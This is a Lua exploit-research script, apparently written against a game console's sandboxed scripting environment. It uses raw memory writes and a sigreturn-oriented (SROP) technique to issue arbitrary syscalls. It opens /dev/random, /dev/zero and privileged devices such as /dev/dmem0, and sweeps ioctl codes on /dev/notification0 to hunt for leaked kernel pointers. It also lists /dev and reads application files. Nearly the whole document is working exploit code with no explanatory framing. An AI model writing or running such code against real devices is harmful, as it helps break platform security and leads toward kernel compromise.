-- CRASH_CLASS: MODERATE
-- PROBE 131b: Fast SROP read + ioctl test
--
-- Minimal version: open /dev/random, read from it, open /dev/notification0,
-- try ioctl, open /dev/dmem0, try reading. Reduced buffer zeroing.

print("=== PROBE 131b: FAST SROP READ + IOCTL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function write_str(buf, s)
    for i = 1, #s do pcall(function() memory.write_byte(buf+i-1, string.byte(s,i)) end) end
    pcall(function() memory.write_byte(buf+#s, 0) end)
end

local sc20 = make_syscall(20)
local sc_getcontext = make_syscall(421)
local sc_sigreturn = make_syscall(417)
local pid = to_num(sc20())
print("[0] pid=" .. pid)

local MC = 0x40
local CTX_SIZE = 0x500

local function srop(num, a1, a2, a3)
    local ctx = memory.alloc(CTX_SIZE)
    for off = 0, CTX_SIZE - 4, 4 do wd(ctx+off, 0) end
    pcall(function() return sc_getcontext(uint64(ctx)) end)
    local rip_val = rq(ctx + MC + 0xA0)
    local rh, rl = get_hi_lo(rip_val)
    wq(ctx + MC + 0xA0, uint64(string.format("0x%X%08X", rh, rl - 2)))
    wq(ctx + MC + 0x38, uint64(num))  -- RAX
    if a1 then wq(ctx + MC + 0x08, a1) end  -- RDI
    if a2 then wq(ctx + MC + 0x10, a2) end  -- RSI
    if a3 then wq(ctx + MC + 0x18, a3) end  -- RDX
    local ok, rv = pcall(function() return sc_sigreturn(uint64(ctx)) end)
    return rv, ok
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(8*0x4000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("[0] gpu=" .. hex(gpu))
local P = gpu          -- path buffer
local B = gpu + 0x100  -- general buffer

--------------------------------------------------------------------
-- 1. read from /dev/random
--------------------------------------------------------------------
print("")
write_str(P, "/dev/random")
local fd_rnd = to_num(srop(5, P, uint64(0)))
print("[1] /dev/random fd=" .. fd_rnd)

if fd_rnd > 0 and fd_rnd < 256 then
    for i = 0, 0x1C, 4 do wd(B+i, 0) end
    local rv = srop(3, uint64(fd_rnd), B, uint64(16))
    local rh, rl = get_hi_lo(rv)
    print("[1] read(16): rv=" .. hex(rv))
    if rl == 16 then
        print("[1] *** READ WORKS: " .. hex(rq(B)) .. " " .. hex(rq(B+8)) .. " ***")
    end
    srop(6, uint64(fd_rnd))  -- close
end
print("[1] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 2. read from /dev/zero
--------------------------------------------------------------------
print("")
write_str(P, "/dev/zero")
local fd_z = to_num(srop(5, P, uint64(0)))
print("[2] /dev/zero fd=" .. fd_z)
if fd_z > 0 and fd_z < 256 then
    wd(B, 0xDEAD); wd(B+4, 0xBEEF)
    local rv = srop(3, uint64(fd_z), B, uint64(8))
    print("[2] read(8): rv=" .. hex(rv) .. " buf=" .. hex(rq(B)))
    srop(6, uint64(fd_z))
end

--------------------------------------------------------------------
-- 3. ioctl on /dev/notification0
--------------------------------------------------------------------
print("")
write_str(P, "/dev/notification0")
local fd_n = to_num(srop(5, P, uint64(2)))  -- O_RDWR
print("[3] /dev/notification0 fd=" .. fd_n)

if fd_n > 0 and fd_n < 256 then
    -- Try a wide sweep of ioctl codes
    for base = 0, 0x20 do
        for i = 0, 0x1C, 4 do wd(B+i, 0) end
        local code = 0xC0104E00 + base  -- _IOWR('N', base, struct[16])
        local rv = srop(54, uint64(fd_n), uint64(code), B)
        local rh, rl = get_hi_lo(rv)
        if rl == 0 and rh == 0 then
            print(string.format("[3] ioctl(0x%08X): OK! buf=%s %s", code, hex(rq(B)), hex(rq(B+8))))
            -- Check for kernel pointers
            for off = 0, 0x1C, 8 do
                local v = rq(B + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        print("  *** KERNEL POINTER at +" .. string.format("0x%X", off) .. ": " .. hex(v) .. " ***")
                    end
                end
            end
        end
    end
    srop(6, uint64(fd_n))
end
print("[3] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 4. open more devices for kernel interaction
--------------------------------------------------------------------
print("")
print("--- [4] More devices ---")
local devs = {
    "/dev/dmem0", "/dev/dmem1", "/dev/gc",
    "/dev/rng", "/dev/dipsw", "/dev/camera",
    "/dev/ajm", "/dev/av_control",
    "/dev/icc_configuration", "/dev/icc_power",
    "/dev/sbl_srv", "/dev/cd0",
}
for _, d in ipairs(devs) do
    write_str(P, d)
    local rv = srop(5, P, uint64(0))
    local rh, rl = get_hi_lo(rv)
    if rl < 256 and rh == 0 then
        print("  " .. d .. ": fd=" .. rl .. " *** OPEN ***")
        srop(6, uint64(rl))
    else
        print("  " .. d .. ": FAIL")
    end
end
print("[4] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 5. List /dev/ directory
--------------------------------------------------------------------
print("")
print("--- [5] readdir /dev ---")
write_str(P, "/dev")
local fd_dev = to_num(srop(5, P, uint64(0x10000)))
if fd_dev >= 256 then
    fd_dev = to_num(srop(5, P, uint64(0)))
end
print("[5] /dev fd=" .. fd_dev)
if fd_dev > 0 and fd_dev < 256 then
    local dir_buf = gpu + 0x1000
    for i = 0, 0x7C, 4 do wd(dir_buf+i, 0) end
    local rv = srop(272, uint64(fd_dev), dir_buf, uint64(0x2000))
    local rh, rl = get_hi_lo(rv)
    print("[5] getdirentries: rv=" .. hex(rv))
    if rl > 0 and rl < 0x2000 then
        print("[5] " .. rl .. " bytes!")
        local pos = 0
        local cnt = 0
        while pos < rl and cnt < 50 do
            local d4 = rd(dir_buf + pos + 4)
            if d4 == nil or d4 == 0 then break end
            local reclen = d4 % 65536
            local namlen = math.floor(d4 / 16777216)
            if reclen == 0 then break end
            local name = ""
            for i = 0, math.min(namlen, 30) - 1 do
                local b = rd(dir_buf + pos + 8 + i)
                if b and b >= 32 and b < 127 then name = name .. string.char(b) end
            end
            if #name > 0 then print("  " .. name) end
            pos = pos + reclen
            cnt = cnt + 1
        end
    end
    srop(6, uint64(fd_dev))
end
print("[5] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- 6. Try opening /app0 files
--------------------------------------------------------------------
print("")
print("--- [6] open /app0 files ---")
local app_paths = {"/app0/eboot.bin", "/app0/sce_sys/param.sfo"}
for _, p in ipairs(app_paths) do
    write_str(P, p)
    local rv = srop(5, P, uint64(0))
    local rh, rl = get_hi_lo(rv)
    if rl < 256 and rh == 0 then
        print("  " .. p .. ": fd=" .. rl)
        for i = 0, 0x3C, 4 do wd(B+i, 0) end
        local rv_r = srop(3, uint64(rl), B, uint64(64))
        print("  read: rv=" .. hex(rv_r) .. " hdr=" .. hex(rq(B)) .. " " .. hex(rq(B+8)))
        srop(6, uint64(rl))
    else
        print("  " .. p .. ": FAIL")
    end
end

print("")
print("[FINAL] pid=" .. to_num(sc20()))
print("=== PROBE 131b COMPLETE ===")
